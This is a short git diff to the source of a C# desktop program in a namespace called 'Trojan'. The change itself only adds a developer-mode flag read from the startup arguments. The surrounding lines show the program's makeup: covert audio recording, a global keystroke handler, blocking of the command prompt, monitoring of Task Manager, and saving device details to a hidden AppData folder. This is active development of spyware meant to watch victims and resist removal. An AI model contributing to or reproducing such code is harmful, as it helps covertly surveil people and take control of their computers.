@@ -16,6 +16,8 @@ namespace Trojan
         private AudioRecorderService _audioRecorder;
         private CmdBlockerService _cmdBlockerService;
         private TaskManagerMonitorService _taskManagerMonitorService;
+        public static bool _devMode { get; private set; }
+
         protected override async void OnStartup(StartupEventArgs e)
         {
             base.OnStartup(e);
@@ -25,6 +27,8 @@ namespace Trojan
             new KeyEventHandler(GlobalKeyHandler));
 
             await DeviceScannerService.SaveDeviceInfo();
+            
+            _devMode = e.Args.Contains("dev");
 
             //PODATKE O NAPRAVI SE SHRAANIJO NA "C:\Users\IME\AppData\Roaming\gnezdece\device_info.txt"
 
